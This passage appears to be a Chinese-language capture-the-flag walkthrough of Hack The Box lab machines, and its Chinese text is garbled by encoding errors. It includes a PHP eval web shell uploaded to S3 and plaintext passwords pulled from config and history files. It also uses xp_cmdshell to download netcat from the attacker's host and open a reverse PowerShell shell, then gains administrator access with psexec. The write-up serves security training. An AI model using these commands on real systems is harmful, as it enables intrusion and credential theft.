class="hljs-keyword">to</span> <span class="hljs-keyword">set</span> <span class="hljs-keyword">up</span> the AWS CLI installation?<br>:aws configure<br></code></pre></td></tr></table></figure><h3 id="Task-8-3"><a href="#Task-8-3" class="headerlink" title="Task 8"></a>Task 8</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">aws <span class="hljs-params">--endpoint</span> http:<span class="hljs-string">//s3.thetoppers.htb</span> s3 <span class="hljs-keyword">ls</span><br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">command</span> used by the above utility <span class="hljs-keyword">to</span> <span class="hljs-keyword">list</span> <span class="hljs-keyword">all</span> of the S3 buckets?<br>:aws s3 <span class="hljs-keyword">ls</span><br></code></pre></td></tr></table></figure><h3 id="Task-9-3"><a href="#Task-9-3" class="headerlink" title="Task 9"></a>Task 9</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">aws</span> --endpoint http://s3.thetoppers.htb s3 ls<br><span class="hljs-attribute">2025</span>-<span class="hljs-number">02</span>-<span class="hljs-number">19</span> <span class="hljs-number">04</span>:<span class="hljs-number">43</span>:<span class="hljs-number">54</span>          <span class="hljs-number">0</span> .htaccess<br><span class="hljs-attribute">2025</span>-<span class="hljs-number">02</span>-<span class="hljs-number">19</span> <span class="hljs-number">04</span>:<span class="hljs-number">43</span>:<span class="hljs-number">54</span>      <span class="hljs-number">11952</span> index.php<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">This <span class="hljs-keyword">server</span> <span class="hljs-keyword">is</span> configured <span class="hljs-keyword">to</span> run files written <span class="hljs-keyword">in</span> what web scripting <span class="hljs-keyword">language</span>?<br>:php<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-4"><a href="#Submit-Flag-4" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>å†™ä¸€ä¸ªä¸€å¥è¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä¼ ä¸Šå»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws --endpoint http://s3.thetoppers.htb s3 <span class="hljs-built_in">cp</span> shell.php s3://thetoppers.htb/shell.php<br></code></pre></td></tr></table></figure><p>ç„¶åç›´æ¥ curl</p><p><img src="https://img.dkdun.cn/v1/2025/12/3fe56a29ed468bdc.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:a980d99281a28d638ac68b9bf9453c2b<br></code></pre></td></tr></table></figure><h1 id="Tier-2"><a href="#Tier-2" class="headerlink" title="Tier 2"></a>Tier 2</h1><h2 id="Archetype"><a href="#Archetype" class="headerlink" title="Archetype"></a>Archetype</h2><h3 id="Task-1-5"><a href="#Task-1-5" class="headerlink" title="Task 1"></a>Task 1</h3><p>nmap æ‰«æï¼Œæ‰«åˆ°äº† 1433 ç«¯å£çš„ <code>ms-sql-s</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs cmd">â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/home/butt3rf1y]<br>â””â”€# nmap -sC -sV <span class="hljs-number">10</span>.<span class="hljs-number">129</span>.<span class="hljs-number">215</span>.<span class="hljs-number">139</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">03</span> <span class="hljs-number">16</span>:<span class="hljs-number">52</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10</span>.<span class="hljs-number">129</span>.<span class="hljs-number">215</span>.<span class="hljs-number">139</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">48</span>s latency).<br><span class="hljs-keyword">Not</span> shown: <span class="hljs-number">996</span> closed tcp ports (reset)<br>PORT     STATE SERVICE      VERSION<br><span class="hljs-number">135</span>/tcp  open  msrpc        Microsoft Windows RPC<br><span class="hljs-number">139</span>/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn<br><span class="hljs-number">445</span>/tcp  open  microsoft-ds Windows Server <span class="hljs-number">2019</span> Standard <span class="hljs-number">17763</span> microsoft-ds<br><span class="hljs-number">1433</span>/tcp open       Microsoft SQL Server <span class="hljs-number">2017</span> <span class="hljs-number">14</span>.<span class="hljs-number">00</span>.<span class="hljs-number">1000</span>.<span class="hljs-number">00</span>; RTM<br>| ms-sql-info:<br>|   <span class="hljs-number">10</span>.<span class="hljs-number">129</span>.<span class="hljs-number">215</span>.<span class="hljs-number">139</span>:<span class="hljs-number">1433</span>:<br>|     Version:<br>|       name: Microsoft SQL Server <span class="hljs-number">2017</span> RTM<br>|       number: <span class="hljs-number">14</span>.<span class="hljs-number">00</span>.<span class="hljs-number">1000</span>.<span class="hljs-number">00</span><br>|       Product: Microsoft SQL Server <span class="hljs-number">2017</span><br>|       Service pack level: RTM<br>|       Post-SP patches applied: false<br>|_    TCP port: <span class="hljs-number">1433</span><br>|_ssl-<span class="hljs-built_in">date</span>: <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">03</span>T08:<span class="hljs-number">53</span>:<span class="hljs-number">01</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; +<span class="hljs-number">2</span>s from scanner <span class="hljs-built_in">time</span>.<br>| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback<br>| <span class="hljs-keyword">Not</span> valid before: <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">03</span>T08:<span class="hljs-number">44</span>:<span class="hljs-number">06</span><br>|_Not valid after:  <span class="hljs-number">2055</span>-<span class="hljs-number">03</span>-<span class="hljs-number">03</span>T08:<span class="hljs-number">44</span>:<span class="hljs-number">06</span><br>| ms-sql-ntlm-info:<br>|   <span class="hljs-number">10</span>.<span class="hljs-number">129</span>.<span class="hljs-number">215</span>.<span class="hljs-number">139</span>:<span class="hljs-number">1433</span>:<br>|     Target_Name: ARCHETYPE<br>|     NetBIOS_Domain_Name: ARCHETYPE<br>|     NetBIOS_Computer_Name: ARCHETYPE<br>|     DNS_Domain_Name: Archetype<br>|     DNS_Computer_Name: Archetype<br>|_    Product_Version: <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">17763</span><br>Service Info: OSs: Windows, Windows Server <span class="hljs-number">2008</span> R2 - <span class="hljs-number">2012</span>; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb-os-discovery:<br>|   OS: Windows Server <span class="hljs-number">2019</span> Standard <span class="hljs-number">17763</span> (Windows Server <span class="hljs-number">2019</span> Standard <span class="hljs-number">6</span>.<span class="hljs-number">3</span>)<br>|   Computer name: Archetype<br>|   NetBIOS computer name: ARCHETYPE\x00<br>|   Workgroup: WORKGROUP\x00<br>|_  System <span class="hljs-built_in">time</span>: <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">03</span>T00:<span class="hljs-number">52</span>:<span class="hljs-number">45</span>-<span class="hljs-number">08</span>:<span class="hljs-number">00</span><br>|_clock-skew: mean: <span class="hljs-number">1</span>h36m02s, deviation: <span class="hljs-number">3</span>h34m41s, median: <span class="hljs-number">1</span>s<br>| smb2-<span class="hljs-built_in">time</span>:<br>|   <span class="hljs-built_in">date</span>: <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">03</span>T08:<span class="hljs-number">52</span>:<span class="hljs-number">46</span><br>|_  start_date: N/A<br>| smb2-security-<span class="hljs-built_in">mode</span>:<br>|   <span class="hljs-number">3</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>:<br>|_    Message signing enabled but <span class="hljs-keyword">not</span> required<br>| smb-security-<span class="hljs-built_in">mode</span>:<br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br><br>Service detection performed. Please report any incorrect results <span class="hljs-built_in">at</span> https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">33</span>.<span class="hljs-number">51</span> seconds<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Which TCP port <span class="hljs-keyword">is</span> hosting a <span class="hljs-keyword">database</span> <span class="hljs-keyword">server</span>?<br>:<span class="hljs-number">1433</span><br></code></pre></td></tr></table></figure><h3 id="Task-2-5"><a href="#Task-2-5" class="headerlink" title="Task 2"></a>Task 2</h3><p>å…³äº SMBï¼ˆæœåŠ¡å™¨æ¶ˆæ¯å—ï¼‰æœåŠ¡å™¨æ˜¯ä¸€ç§ç½‘ç»œåè®®ï¼Œå…è®¸è®¾å¤‡é€šè¿‡ç½‘ç»œå…±äº«æ–‡ä»¶ã€æ‰“å°æœºå’Œå…¶ä»–èµ„æºï¼Œé€šè¿‡ç½‘ç»œä¿ƒè¿›å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ï¼Œå¯ä»¥é€šè¿‡ <code>smbclient</code> è¿æ¥</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/home/butt3rf1y]<br>â””â”€# smbclient -N -L \\\\<span class="hljs-number">10.129</span><span class="hljs-number">.215</span><span class="hljs-number">.139</span>\\<br><br>        Sharename       <span class="hljs-keyword">Type</span>      <span class="hljs-keyword">Comment</span><br>        <span class="hljs-comment">---------       ----      -------</span><br>        <span class="hljs-keyword">ADMIN</span>$          Disk      Remote <span class="hljs-keyword">Admin</span><br>        backups         Disk<br>        C$              Disk      <span class="hljs-keyword">Default</span> <span class="hljs-keyword">share</span><br>        IPC$            IPC       Remote IPC<br>Reconnecting <span class="hljs-keyword">with</span> SMB1 <span class="hljs-keyword">for</span> workgroup listing.<br>do_connect: <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">to</span> <span class="hljs-number">10.129</span><span class="hljs-number">.215</span><span class="hljs-number">.139</span> failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">connect</span> <span class="hljs-keyword">with</span> SMB1 <span class="hljs-comment">-- no workgroup available</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡ IP ä½¿ç”¨ <code>-N</code> æ— å¯†ç è¿æ¥ï¼ŒæŸ¥çœ‹</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-type">name</span> <span class="hljs-keyword">of</span> the non-Administrative <span class="hljs-keyword">share</span> available <span class="hljs-keyword">over</span> SMB?<br>:backups  <br></code></pre></td></tr></table></figure><h3 id="Task-3-5"><a href="#Task-3-5" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs tap">â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/home/butt3rf1y]<br>â””â”€<span class="hljs-comment"># smbclient -N \\\\10.129.215.139\\backups</span><br>Try &quot;help&quot; to get a list of possible commands.<br>smb: \&gt; dir<br>  .                                   D       <span class="hljs-number"> 0 </span> Mon Jan<span class="hljs-number"> 20 </span>20:20:57 2020<br>  ..                                  D       <span class="hljs-number"> 0 </span> Mon Jan<span class="hljs-number"> 20 </span>20:20:57 2020<br>  prod.dtsConfig                     AR     <span class="hljs-number"> 609 </span> Mon Jan<span class="hljs-number"> 20 </span>20:23:02 2020<br><br>               <span class="hljs-number"> 5056511 </span>blocks of size 4096.<span class="hljs-number"> 2618271 </span>blocks available<br>smb: \&gt; get prod.dtsConfig<br>getting file \prod.dtsConfig of size<span class="hljs-number"> 609 </span>as prod.dtsConfig (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)<br>smb: \&gt; ^Z<br>[3]+  Stopped                 smbclient -N \\\\10.129.215.139\\backups<br></code></pre></td></tr></table></figure><p>æŠŠé…ç½®æ–‡ä»¶ <code>prod.dtsConfig</code> ä¸‹è½½ä¸‹æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mssql">â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/home/butt3rf1y]<br>â””â”€# cat prod.dtsConfig<br>&lt;DTSConfiguration&gt;<br>    &lt;DTSConfigurationHeading&gt;<br>        &lt;DTSConfigurationFileInfo GeneratedBy=&quot;...&quot; GeneratedFromPackageName=&quot;...&quot; GeneratedFromPackageID=&quot;...&quot; GeneratedDate=&quot;20.1.2019 10:01:34&quot;/&gt;<br>    &lt;/DTSConfigurationHeading&gt;<br>    &lt;Configuration ConfiguredType=&quot;Property&quot; Path=&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot; ValueType=&quot;String&quot;&gt;<br>        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYP<br>        E\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;<br>    &lt;/Configuration&gt;<br>&lt;/DTSConfiguration&gt;<br></code></pre></td></tr></table></figure><p><code>Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc</code></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> password identified <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">on</span> <span class="hljs-title">the</span> <span class="hljs-title">SMB</span> <span class="hljs-title">share</span>?<br>:M3g4c0rp123<br></code></pre></td></tr></table></figure><h3 id="Task-4-5"><a href="#Task-4-5" class="headerlink" title="Task 4"></a>Task 4</h3><p><a href="https://github.com/fortra/impacket">impacket</a></p><p>è¿›å…¥ <code>impacket/examples/</code> æ‰§è¡Œ</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> mssqlclient.py sql_svc@<span class="hljs-number">10.129.215.139</span> -windows-auth<br></code></pre></td></tr></table></figure><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæˆ‘çš„åªèƒ½æ‰§è¡Œç”¨æˆ· ID ä¸º <code>sql_svc</code>ï¼Œè€Œä¸æ˜¯ <code>ARCHETYPE\sql_svc</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What script <span class="hljs-keyword">from</span> Impacket collection can be used <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> establish an authenticated <span class="hljs-keyword">connection</span> <span class="hljs-keyword">to</span> a Microsoft <span class="hljs-keyword">SQL</span> <span class="hljs-keyword">Server</span>?<br>:mssqlclient.py<br></code></pre></td></tr></table></figure><h3 id="Task-5-5"><a href="#Task-5-5" class="headerlink" title="Task 5"></a>Task 5</h3><p><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">SELECT is_srvrolemember(â€˜sysadminâ€™);<br></code></pre></td></tr></table></figure><p>æ£€æŸ¥æ˜¯å¦æœ‰æƒé™ï¼Œè¿”å› 1 å°±æ˜¯æœ‰</p><p><a href="https://learn.microsoft.com/zh-cn/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16">xp_cmdshell</a></p><p><code>SQL SERVER</code> æœ‰ä¸€ä¸ª <code>xp_shell</code> çš„æ‰©å±•å­˜å‚¨è¿‡ç¨‹å¯ä»¥ç”Ÿæˆ <code>windows shell</code>ï¼Œ<code>xp_cmdshell</code> æ˜¯ä¸€ä¸ª SQL Server çš„æ‰©å±•å­˜å‚¨è¿‡ç¨‹ï¼Œå®ƒå…è®¸æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹,<code>xp_cmdshell</code> å¯èƒ½åœ¨ <code>SQL Server</code> ä¸Šè¢«ç¦ç”¨ï¼Œéœ€è¦å…ˆå¯ç”¨å®ƒ</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs hsp"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>RECONFIGURE<span class="hljs-comment">;</span><br><span class="hljs-meta">#å¯åŠ¨ p_cmdshell</span><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>RECONFIGURE<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs delphi">What extended <span class="hljs-keyword">stored</span> <span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">of</span> <span class="hljs-title">Microsoft</span> <span class="hljs-title">SQL</span> <span class="hljs-title">Server</span> <span class="hljs-title">can</span> <span class="hljs-title">be</span> <span class="hljs-title">used</span> <span class="hljs-title">in</span> <span class="hljs-title">order</span> <span class="hljs-title">to</span> <span class="hljs-title">spawn</span> <span class="hljs-title">a</span> <span class="hljs-title">Windows</span> <span class="hljs-title">command</span> <span class="hljs-title">shell</span>?</span><br><span class="hljs-function">:</span>xp_xmdshell<br></code></pre></td></tr></table></figure><h3 id="Task-6-5"><a href="#Task-6-5" class="headerlink" title="Task 6"></a>Task 6</h3><p>Windows ææƒå·¥å…· <a href="https://github.com/peass-ng/PEASS-ng">winpeas</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What script can be used <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">search</span> possible paths <span class="hljs-keyword">to</span> escalate <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">on</span> Windows hosts?<br>:winpeas<br></code></pre></td></tr></table></figure><h3 id="Task-7-5"><a href="#Task-7-5" class="headerlink" title="Task 7"></a>Task 7</h3><p>æˆ‘å…ˆä¸Šä¼ äº† nc ï¼Œç„¶åè¿ä¸Šäº†é¶æœºï¼Œæ‰€ä»¥å°±ç›´æ¥åœ¨é‡Œé¢ wget äº†</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">wget</span> http://10.10.16.31:8000/winPEASx64.exe -o winPEASx64.exe<br></code></pre></td></tr></table></figure><p>ç„¶åç›´æ¥è¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./winPEASx64.exe<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ <code>Powershell Settings</code> è¿™é‡Œçš„æ•°æ®</p><p><img src="https://img.dkdun.cn/v1/2025/12/67eac352d7891d86.png"></p><p>æŸ¥çœ‹ ps çš„å†å²è®°å½•</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-built_in">type</span> <span class="hljs-name">C</span>:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br></code></pre></td></tr></table></figure><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">PS <span class="hljs-name">C</span>:\users\sql_svc&gt; <span class="hljs-built_in">type</span> <span class="hljs-name">C</span>:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br><span class="hljs-built_in">type</span> <span class="hljs-name">C</span>:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt<br>net.exe use <span class="hljs-name">T</span>: \\Archetype\backups /<span class="hljs-name">user</span>:administrator MEGACORP_4dm1n!!<br>exit<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°å¯†ç ï¼šMEGACORP_4dm1n!!</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-built_in">file</span> <span class="hljs-keyword">contains</span> <span class="hljs-keyword">the</span> administrator&#x27;s password?<br>:ConsoleHost_history.txt<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-5"><a href="#Submit-Flag-5" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>wsl å¦å¤–èµ·ä¸€ä¸ª http æœåŠ¡ï¼Œç›®å½•ä¸‹è¦å­˜åœ¨ <code>nc64.exe</code> ï¼Œç”¨äºä¸Šä¼ åˆ°é¶æœº</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">python3 -m http.<span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><p>ç„¶åå†æ‰§è¡Œ</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">EXEC xp_cmdshell &#x27;curl -o C:\Users\sql_svc\nc.exe http://10.10.16.31:<span class="hljs-number">8000</span>/nc64.exe&#x27;<span class="hljs-punctuation">;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/c2a56c6e6ffa3068.png"></p><p>å¤ªä¸å®¹æ˜“äº†ï¼Œç»ˆäºä¼ ä¸Šå»äº†</p><p>ç„¶åæ‰§è¡Œï¼Œåå¼¹ shell </p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">EXEC xp_cmdshell &#x27;C:\Users\sql_svc\nc 10.10.16.31 <span class="hljs-number">1234</span> -e powershell&#x27;<span class="hljs-punctuation">;</span><br></code></pre></td></tr></table></figure><p>ç›‘å¬å¾—åˆ°</p><p><img src="https://img.dkdun.cn/v1/2025/12/8d1eb2bd3bb6bb97.png"></p><p>è¿›å…¥ <code>sql_svc</code> ç”¨æˆ·å¾—åˆ° userflag</p><p><img src="https://img.dkdun.cn/v1/2025/12/70e4a24ff74565c8.png"></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Submit <span class="hljs-keyword">user</span> <span class="hljs-title">flag</span><br>:<span class="hljs-number">3</span>e7b102e78218e935bf3f4951fec21a3<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-6"><a href="#Submit-Flag-6" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>æ ¹æ®ä¹‹å‰æ‰¾åˆ°çš„ç”¨æˆ·å’Œå¯†ç </p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">administrator:MEGACORP_4dm1n!!<br></code></pre></td></tr></table></figure><p>ç”¨ <code>psexec</code> è¿›è¡Œè¿æ¥</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> psexec.py ARCHETYPE/administrator@<span class="hljs-number">10.129.50.161</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/55892af842e8dc23.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:b91ccec3305e98240082d4474b848528<br></code></pre></td></tr></table></figure><h2 id="Oopsie"><a href="#Oopsie" class="headerlink" title="Oopsie"></a>Oopsie</h2><h3 id="Task-1-6"><a href="#Task-1-6" class="headerlink" title="Task 1"></a>Task 1</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">With</span> what kind <span class="hljs-keyword">of</span> tool can intercept web traffic?<br>:proxy<br></code></pre></td></tr></table></figure><h3 id="Task-2-6"><a href="#Task-2-6" class="headerlink" title="Task 2"></a>Task 2</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns">â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/home/butt3rf1y]<br>â””â”€# nmap -sS -sC -Pn <span class="hljs-number">10.129.191.100</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2025-03-04</span> <span class="hljs-number">21</span>:<span class="hljs-number">43</span> CST<br>Nmap scan report for <span class="hljs-number">10.129.191.100</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">49</span>s latency).<br>Not shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE SERVICE<br><span class="hljs-number">22</span>/tcp open  ssh<br>| ssh-hostkey:<br>|   <span class="hljs-number">2048</span> <span class="hljs-number">61:e4:3f:d4:1e:e2:b2:f1</span>:<span class="hljs-number">0d:3c:ed:36:28:36:67:c7</span> (RSA)<br>|   <span class="hljs-number">256</span> <span class="hljs-number">24:1d:a4:17:d4:e3:2a:9c</span>:<span class="hljs-number">90:5c:30:58:8f:60:77:8d</span> (ECDSA)<br>|_  <span 